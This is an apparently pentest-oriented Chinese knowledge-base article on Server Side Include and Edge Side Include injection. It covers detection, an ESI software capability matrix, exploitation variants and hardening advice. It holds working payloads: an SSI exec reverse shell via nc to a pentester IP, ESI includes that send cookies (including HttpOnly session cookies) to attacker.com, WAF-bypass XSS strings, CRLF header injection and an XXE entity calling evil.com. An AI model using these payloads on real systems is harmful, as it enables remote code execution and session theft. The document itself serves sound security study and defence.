---
attack_surface:
  - 缓存/代理逻辑
  - 注入类
impact:
  - 远程代码执行
  - 信息泄露
  - 完整性破坏
risk_level: 高
prerequisites:
  - HTTP 缓存机制（Cache-Control、Surrogate-Control）
  - HTML 注释与 XML 语法基础
related_techniques:
  - xss
  - xslt-injection
  - xxe
  - cache-poisoning
  - ssrf
  - crlf-injection
  - open-redirect
difficulty: 中级
tools:
  - burp-suite
  - ssi-esi-wordlist
status: NEEDS_HUMAN_REVIEW
degradation_reason: |
  8 个资源中 3 个降解（37.5%）。P0-01 / P0-02 GoSecure 两篇 ESI 原始研究
  （2018 Part 1、2019 Part 2）：域名已迁移，全部回退工具穷尽
  （curl → 官网首页壳 2493 字节；bb-browser 无 fetch 命令；Playwright 渲染
  仍为官网首页；代理 127.0.0.1:10808 未运行）。恢复尝试：archive.org
  availability API 超时（直连 exit 28、代理 exit 7）、web.archive.org 直连超时。
  核心内容已由 Hacktricks 二手源保留（能力矩阵 §2.3、CVE-2019-2438 payload §4.8），
  但 Part 2 中各实现细节与 CVE 受影响产品/版本无法独立验证。
  P2-01 infosecwriteups：Cloudflare 机器人验证墙（curl 与 Playwright 均被拦）。
verified_resources: |
  P1: httpd.apache.org SSI 教程（21 KB — exec 执行环境、config 指令、
  IncludesNOEXEC 安全原文已补充 §3.1/§3.2/§3.4/§A.2）
  P2: Auto_Wordlists ssi_esi.txt（92 行 — 字典内容摘要已补充 §A.3）
  XREF: XSLT / XSS README / nginx.md 均 READ + MERGE
---

# Server Side Inclusion & Edge Side Inclusion Injection — 服务端包含与边缘侧包含注入

> 关联文档：[XSLT Server Side Injection](../XSLT%20Server%20Side%20Injection/README.md) · [XXE](../../User%20input/Structured%20objects/XXE/README.md) · [XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [Cache Poisoning&Cache Deception](../Cache%20Poisoning%26Cache%20Deception/README.md) · [CRLF 注入](../../User%20input/Reflected%20Values/CRLF/README.md) · [Open Redirect](../../User%20input/Reflected%20Values/Open%20Redirect/README.md)

---

### 知识路径

```plaintext
Server Side Inclusion & Edge Side Inclusion（本文档）
  ├── SSI：Web 服务器在 HTML 输出管线中对 <!--#directive ... --> 注释指令的二次解释
  │     └── 上游：HTTP 基础 · Apache / Nginx 模块（mod_include / ngx_http_ssi_filter_module）
  ├── ESI：缓存 / 边缘节点（Surrogate）对 <esi:*> XML 标记的解释
  │     └── 上游：HTTP 缓存机制（Cache-Control、Vary、Surrogate-Control）
  ├── 升级链：ESI + XSLT → XXE / SSRF（见 XSLT Server Side Injection 文档）
  └── 攻击链入口：反射 / 存储型 XSS 位置、任意响应内容注入（见 XSS 文档）
```

---

# 0x01 原理与分类

## 1.1 两种服务器侧包含技术

### SSI — Server Side Includes（服务端包含）

> 引言取自 [Apache 官方文档](https://httpd.apache.org/docs/current/howto/ssi.html)

SSI（Server Side Includes）是**放置在 HTML 页面中、在服务器提供页面的同时被服务器求值**的指令。它们允许你向现有 HTML 页面**添加动态生成的内容**，而无需通过 CGI 程序或其他动态技术提供整个页面。

例如，你可以将如下指令放入现有 HTML 页面：

```html
<!--#echo var="DATE_LOCAL" -->
```

当页面被提供时，该片段会被求值并替换为其值：

```plaintext
Tuesday, 15-Jan-2013 19:28:54 EST
```

何时使用 SSI、何时让页面完全由程序生成，通常取决于页面有多少静态内容、有多少内容需要在每次提供页面时重新计算。SSI 是添加少量信息（如上面展示的当前时间）的好方法。但如果页面大部分内容在提供时生成，则需要寻找其他方案。

如果 Web 应用使用扩展名为 **`.shtml`、`.shtm` 或 `.stm`** 的文件，可以推断存在 SSI，但这并非唯一情况。

典型的 SSI 表达式格式如下：

```html
<!--#directive param="value" -->
```

### ESI — Edge Side Includes（边缘侧包含）

缓存动态应用内容存在一个问题：内容的一部分可能在下一次获取内容时**已经变化**。这就是 **ESI** 的用途——使用 ESI 标签来标记**需要在发送缓存版本之前生成的动态内容**。

如果**攻击者**能够在缓存内容中**注入 ESI 标签**，那么他就可以在文档发送给用户之前，在文档中**注入任意内容**。

## 1.2 根因分析：二次解释与下游处理器信任

SSI 与 ESI 注入共享同一个根因模式——**内容在渲染管线中被下游处理器二次解释**，而攻击者控制的数据恰好落入了这一解释上下文：

- **SSI**：Web 服务器对启用 SSI 的页面先按 HTML 输出、再扫描 `<!--#... -->` 指令。任何流入页面的用户输入（文件名、参数回显、上传内容）只要携带指令语法，就会被服务器当作指令执行。SSI 解释上下文还可能导致更隐蔽的异常行为：Nginx 的 SSI 过滤模块（`ngx_http_ssi_filter_module`）曾被发现在特定情况下将**用户提供的数据当作 Nginx 变量处理**，该异常由 [HackerOne report 370094](https://hackerone.com/reports/370094) 披露并定位到 [SSI 过滤模块源码](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365)。
- **ESI**：缓存 / 边缘节点（Surrogate）在回源响应中解释 `<esi:*>` 标记。攻击者只要能把 ESI 语法注入被缓存的页面——任何反射型或存储型内容注入位置都可以——缓存就会以攻击者可控的语义处理页面片段。受害者从缓存取到的已是**加工后的内容**，攻击面从应用层转移到**缓存基础设施**，常规 WAF 与输入过滤通常不理解 ESI 语义。
- **攻击链升级**：如果在使用缓存的站点上拿到了 [XSS](../../User%20input/Reflected%20Values/XSS/README.md)，可以尝试通过 ESI 注入将其升级为 [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md)，并利用它绕过 Cookie 限制、XSS 过滤器等。

```python
<esi:include src="http://yoursite.com/capture" />
```

## 1.3 SSI vs ESI 对比

| 维度 | SSI | ESI |
|------|-----|-----|
| 执行位置 | Web 服务器（Apache / IIS / Nginx） | 缓存 / 边缘节点（Squid / Varnish / Fastly / Akamai） |
| 标记语法 | HTML 注释 `<!--#directive param="value" -->` | XML 命名空间 `<esi:include .../>` |
| 触发条件 | 页面启用 SSI 解析（`.shtml` 等扩展名或服务器配置） | 缓存启用 ESI 处理，响应携带 `Surrogate-Control` |
| 主要危害 | RCE（`exec`）、任意文件包含、环境变量枚举 | XSS、SSRF、Cookie 窃取、响应头注入、开放重定向、XXE（+XSLT） |
| 检测特征 | 无标准响应头，靠扩展名指纹 | `Surrogate-Control: content="ESI/1.0"` |
| 能力模型 | 指令集固定，取决于服务器配置 | 各实现支持子集不同（见 §2.3 能力矩阵） |

# 0x02 检测 / 前置条件

## 2.1 SSI 指纹与检测

- **扩展名指纹**：`.shtml`、`.shtm`、`.stm`——但并非唯一情况，SSI 也可能通过服务器配置作用于普通扩展名。
- **探测 payload**：向一切可能落入页面的输入（文件名、参数值、上传内容、错误回显）提交：

```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->
```

若返回内容中出现服务器解析后的值（如文档名、服务器本地时间），即确认 SSI 注入。

## 2.2 ESI 检测

服务器响应中出现以下**头**意味着服务器正在使用 ESI：

```http
Surrogate-Control: content="ESI/1.0"
```

如果找不到该头，服务器**可能仍然在使用 ESI**。此时可以采用**盲利用方式**——目标服务器应当向攻击者服务器发起请求：

```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```

- `hell<!--esi-->o` 若被反射为 `hello` → 存在 ESI 处理。
- 盲检测：注入 `<esi:include src=http://attacker.com>`，若攻击者服务器收到来自目标缓存节点的请求 → 确认可利用。
- `<esi:debug/>` 仅对 Akamai 有效，会在响应中附带调试信息。

## 2.3 ESI 软件能力矩阵

[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) 建立了如下表格，用于理解针对不同 ESI 能力软件可以尝试的攻击，取决于其支持的功能：

- **Includes**：支持 `<esi:includes>` 指令
- **Vars**：支持 `<esi:vars>` 指令。对绕过 XSS 过滤器很有用
- **Cookie**：文档 Cookie 对 ESI 引擎可见
- **Upstream Headers Required**：除非上游应用提供相应头，否则 Surrogate 应用不会处理 ESI 语句
- **Host Allowlist**：此情况下 ESI include 仅允许来自被允许服务器主机，使得例如 SSRF 只能针对这些主机发起

|         **Software**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |     Yes      |   Yes    |     Yes     |              Yes              |         No         |
|        Varnish Cache         |     Yes      |    No    |     No      |              Yes              |        Yes         |
|            Fastly            |     Yes      |    No    |     No      |              No               |        Yes         |
| Akamai ESI Test Server (ETS) |     Yes      |   Yes    |     Yes     |              No               |         No         |
|          NodeJS esi          |     Yes      |   Yes    |     Yes     |              No               |         No         |
|        NodeJS nodesi         |     Yes      |    No    |     No      |              No               |      Optional      |

## 2.4 利用前提

1. **内容流入**：用户输入必须进入被 SSI / ESI 处理器处理的内容流——反射型或存储型回显、上传文件、错误页等一切可注入标记的位置。
2. **SSI**：目标文件由启用 SSI 的处理器服务（扩展名指纹或服务器配置）。
3. **ESI**：响应流经支持 ESI 的缓存节点；部分实现（Squid3、Varnish）要求上游提供相应头（Upstream Headers Required）；部分实现（Varnish、Fastly）存在 Host Allowlist，include 目标受限。
4. **能力匹配**：具体可利用的变体取决于目标软件的能力矩阵（§2.3）——例如 Varnish 不支持 `Vars` 与 `Cookie` 访问，则 §4.2 与 §4.3 类攻击不可用。

# 0x03 SSI 指令集与利用

## 3.1 指令集总览

SSI 指令全集与用途：

```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->
```

| 指令 | 用途 | 危害 |
|------|------|------|
| `echo` | 输出变量值（`DOCUMENT_NAME`、`DATE_LOCAL`、`DOCUMENT_URI`、`DOCUMENT_ROOT`、`HTTP_COOKIE`、`REMOTE_ADDR` 等） | 信息泄露 |
| `include virtual` / `include file` | 包含虚拟路径 / 同目录文件，可执行 CGI | 任意文件包含、CGI 结果注入 |
| `flastmod` | 输出文件最后修改时间（支持 `file` / `virtual` 参数） | 信息泄露 |
| `fsize` | 输出文件大小（`bytes` / `abbrev` 格式，`sizefmt` 控制） | 信息泄露 |
| `exec cmd` | 执行系统命令 | **RCE** |
| `config` | 设置错误消息 `errmsg`、时间格式 `timefmt`、文件大小格式 `sizefmt` | 泄露定制、探测辅助 |
| `printenv` | 输出所有环境变量 | 信息泄露 |
| `set` | 设置变量；变量可引用其他变量（`$` 前缀），字面 `$` 用反斜杠转义 | 配合其他指令构造利用 |

补充指令示例（Apache 官方文档与 [ssi_esi.txt 字典](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt)）：

```html
<!--#config errmsg="[Content unavailable]" -->
<!--#config timefmt="A %B %d %Y %r" -->
<!--#fsize file="ssi.shtml" -->
<!--#set var="modified" value="$LAST_MODIFIED" -->
<!--#set var="cost" value="\$100" -->
```

## 3.2 命令执行（RCE）

`exec` 是 SSI 指令集中最危险的一项，可直接执行系统命令：

```javascript
// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

反弹 shell 载荷利用 `mkfifo` 建立命名管道，将 `nc` 输出重定向至 `/bin/bash` 并将交互流回传攻击者主机。

**执行环境**（Apache 官方文档）：`exec` 可以运行 shell 命令并把输出包含进页面。在类 Unix 系统上，命令经 `/bin/sh` 执行；在 Windows 上，经命令 shell 执行——**以 Web 服务器进程的权限运行**。字典中另有探测 / 危害变体：`cat /etc/passwd`、`whoami`、`uname`、`/bin/ls /`、`curl http://...`、`wget http://.../shell.txt`、`sleep 10`（延时盲测）、`perl -e 'print "X"*5000'`（DoS 测试）。

## 3.3 文件包含与信息枚举

```javascript
// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Modification date of a file
<!--#flastmod file="index.html" -->
```

`include virtual` 可以包含 CGI 程序的执行结果，也可用于将敏感文件内容拉入响应；`flastmod` 与 `printenv` 分别泄露文件时间戳与服务器环境变量。

## 3.4 条件与限制

- SSI 解析必须由服务器配置开启（Apache 的 `mod_include` + `Options +Includes`），或文件以被解析的扩展名（`.shtml`、`.shtm`、`.stm`）服务。
- `exec` 指令受服务器配置约束：Apache 的 `Options IncludesNOEXEC` 配置下 `exec` 不可用，但 `include` 等其余指令仍生效。Apache 官方文档明确警告：「**The exec feature is a significant security risk. It executes arbitrary commands with the permissions of the web server process. If users can edit content on your site, ensure this feature is disabled by using IncludesNOEXEC instead of Includes in the Options directive.**」
- 注入位置必须在**服务器解析 SSI 之前**进入页面内容——即输入直接写入 `.shtml` 文件或进入被 SSI 处理的内容流。

# 0x04 ESI 利用变体

## 4.1 XSS 注入

以下 ESI 指令会将任意文件加载到服务器响应中：

```xml
<esi:include src=http://attacker.com/xss.html>
```

在缓存站点上，结合 [XSS](../../User%20input/Reflected%20Values/XSS/README.md) 可升级为对缓存节点的 [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md)：`<esi:include src="http://yoursite.com/capture" />`——详见 §1.2 攻击链。

## 4.2 绕过客户端 XSS 过滤与 WAF

```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```

原理：`esi:assign` + `esi:vars` 在 ESI 引擎层拼出 `<script>` 标签，标签本身不会以完整形式出现在原始响应中；`<!--esi-->` 注释在 ESI 处理时被剥离、浏览器收到的是拼接后的完整 `script` 标签——对基于原始响应内容的 WAF / 客户端过滤器形成绕过。

## 4.3 Cookie 窃取

- 远程窃取 Cookie：

```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```

- 通过响应反射窃取带 `HTTP_ONLY` 标志的 Cookie（配合 XSS）：

```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```

`$(HTTP_COOKIE{'JSESSIONID'})` 语法可按 Cookie 名提取单个 Cookie；httpOnly 标志只限制浏览器脚本读取，不限制 ESI 引擎——将 Cookie 反射进响应后由同源 JS 读取即可绕过。

## 4.4 私有本地文件读取

不要与 "Local File Inclusion" 混淆：

```html
<esi:include src="secret.txt">
```

该指令使缓存节点读取其可达的本地 / 内部文件（相对路径）并注入响应——泄露的是**缓存节点视角**的文件，而非应用服务器的本地文件系统，因此不等同于传统 LFI。

## 4.5 CRLF 注入

```html
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```

在 `src` 属性 URL 中编码 CRLF，可向 ESI 引擎发起的请求追加任意头（如伪造 `X-Forwarded-For: 127.0.0.1`），结合 [CRLF 注入](../../User%20input/Reflected%20Values/CRLF/README.md) 原理实现头走私。

## 4.6 开放重定向

以下指令会向响应添加 `Location` 头：

```bash
<!--esi $add_header('Location','http://attacker.com') -->
```

即通过 ESI 引擎实现 [Open Redirect](../../User%20input/Reflected%20Values/Open%20Redirect/README.md)。

## 4.7 添加请求头与响应头

- 在强制发起的请求中添加头：

```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```

- 在响应中添加头（用于绕过带 XSS 的响应中 `Content-Type: text/json`）：

```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```

`$add_header('Content-Type','text/html')` 将 `text/json` 响应改为可渲染的 HTML，使原本被浏览器拒绝的 XSS 生效；`$url_decode` 嵌套层数对应 payload 可被 URL 编码的次数——需根据应用实际解码次数调整。

## 4.8 Add Header 中的 CRLF（CVE-2019-2438）

```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```

`esi:request_header` 的 `value` 属性中未过滤 CRLF，可在请求头值中注入完整的新头（如上例将 `Host` 篡改为 `anotherhost.com`）——对应 **CVE-2019-2438**（Oracle 相关组件，详见 [GoSecure Part 2](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)）。受影响产品与版本细节见参考资料链接。

## 4.9 Akamai debug 信息泄露

这将在响应中包含调试信息：

```xml
<esi:debug/>
```

仅对 Akamai 有效。调试信息可能包含内部请求处理细节，形成信息泄露。

# 0x05 ESI + XSLT = XXE

## 5.1 dca="xslt" 机制

在 ESI 中可以使用 **XSLT（eXtensible Stylesheet Language Transformations）** 语法，只需将参数 **`dca`** 的值指定为 **`xslt`**。这可能允许滥用 **XSLT** 来创建并利用 XML 外部实体（XXE）漏洞：

```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```

## 5.2 XXE 载荷

XSLT 文件（`poc.xsl`）：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```

ESI 处理器将远端 XML（`poc.xml`）交由 XSLT 引擎转换，若转换过程解析外部实体，`&xxe;` 将被替换为 `http://evil.com/file` 的内容——攻击者服务器收到的实体引用请求或响应中的实体展开即为 [XXE](../../User%20input/Structured%20objects/XXE/README.md) 确认信号。

## 5.3 XSLT SSRF 载荷

来自 XSLT 文档的 ESI SSRF 载荷（`stylesheet` 指向攻击者控制的 XSL）：

```xml
<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl">
</esi:include>
```

XSLT 引擎的进一步利用（`document()`、`unparsed-text()`、扩展函数、EXSLT 元素）见 [XSLT Server Side Injection](../XSLT%20Server%20Side%20Injection/README.md) 文档。

## 5.4 条件与限制

- 需要目标 ESI 实现支持 `dca="xslt"` 参数（如 Akamai 实现）。
- 若 ESI 实现存在 Host Allowlist（§2.3），`src` 与 `stylesheet` 的远端地址受限于允许列表。
- XXE 是否触发取决于 XSLT 引擎的实体解析配置，与 [XSLT 注入](../XSLT%20Server%20Side%20Injection/README.md) 的利用条件一致。

# 0x0A 防御、检测与工具

## A.1 检测方法论

1. **输入点排查**：所有反射 / 存储内容位置（参数回显、上传、错误页）逐个提交 SSI / ESI 探测 payload（§2.1、§2.2）。
2. **响应头指纹**：检查 `Surrogate-Control: content="ESI/1.0"`；缺失不代表不存在 ESI。
3. **盲检测**：`<esi:include src=http://attacker.com>` 观察回连请求。
4. **爆破字典**：使用 [ssi_esi.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt) 对输入点批量提交常见 SSI / ESI 载荷。

## A.2 加固建议

**SSI 侧：**

- 仅在必要时启用 SSI（Apache `mod_include`），并尽量只对 `.shtml` 等专用扩展名开启。
- 使用 Apache 的 `Options IncludesNOEXEC` 替代 `Options Includes` 禁用 `exec` 指令——即使 SSI 被注入，也无法执行系统命令（其余指令仍可用，因此仍需控制输入）。Apache 官方文档原文：「If users can edit content on your site, ensure this feature is disabled by using IncludesNOEXEC instead of Includes in the Options directive.」
- 用户输入在写入任何被 SSI 解析的页面之前，剥离或转义 `<!--#` 序列。

**ESI 侧：**

- 利用 ESI 实现自身的安全属性收紧攻击面：启用 **Upstream Headers Required**（要求上游应用提供头才处理 ESI 语句）与 **Host Allowlist**（include 仅允许白名单主机）——对应 §2.3 能力矩阵中的防护维度。
- 输入过滤需覆盖 ESI 语法（`<esi:`、`<!--esi` 等标记），普通 HTML 过滤通常不识别 ESI 命名空间。
- 缓存层对 `esi:request_header` 值中的 CRLF 做过滤 / 拒绝（CVE-2019-2438 修复思路）。

## A.3 工具与字典

| 工具 | 用途 |
|------|------|
| [ssi_esi.txt 爆破字典](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt) | 92 条 SSI / ESI 检测载荷批量提交（已提取验证：含 50+ `echo` 环境变量枚举、`exec` 命令变体、`config`/`fsize`/`flastmod`/`include`/`printenv` 指令、ESI `debug`/`include`/`assign` 载荷） |
| Burp Suite | 请求构造、`%0d%0a` 编码载荷、响应对比 |
| 自建 HTTP 监听器 | ESI 盲检测回连确认 |

## 参考资料

- [2/5 DEGRADED] [GoSecure — Beyond XSS: Edge Side Include Injection](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) — 状态：域名重定向至官网首页（博客已迁移） | 结果：正文不可达 | 动作：核心内容（§2.3 能力矩阵）已由 hacktricks 二手源内联保留，无需额外动作
- [2/5 DEGRADED] [GoSecure — ESI Injection Part 2: Abusing specific implementations](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) — 状态：同上重定向 | 结果：正文不可达 | 动作：核心内容（CVE-2019-2438 payload）已由 hacktricks 二手源内联保留，CVE 受影响产品细节标记 NEEDS_HUMAN_REVIEW
- [1/5 DEGRADED] [InfoSec Writeups — Exploring the world of ESI Injection](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91) — 状态：Cloudflare 机器人验证墙（curl 与 Playwright 均被拦） | 结果：正文不可达 | 动作：源中无引用内容，仅作参考链接保留
- [5/5 VERIFIED] [Apache — Apache Tutorial: Introduction to Server Side Includes](https://httpd.apache.org/docs/current/howto/ssi.html) — 状态：curl → 200 OK, 21 KB | 结果：正文✓ 技术✓ 非空壳✓ 非摘要✓ 内容已提取✓（exec 执行环境、config 指令、IncludesNOEXEC 安全章节已补充 §3.1/§3.2/§3.4/§A.2）
- [5/5 VERIFIED] [Auto_Wordlists — ssi_esi.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt) — 状态：curl raw.githubusercontent → 200 OK, 92 行 | 结果：正文✓ 技术✓ 非空壳✓ 非摘要✓ 内容已提取✓（字典内容摘要已补充 §A.3）
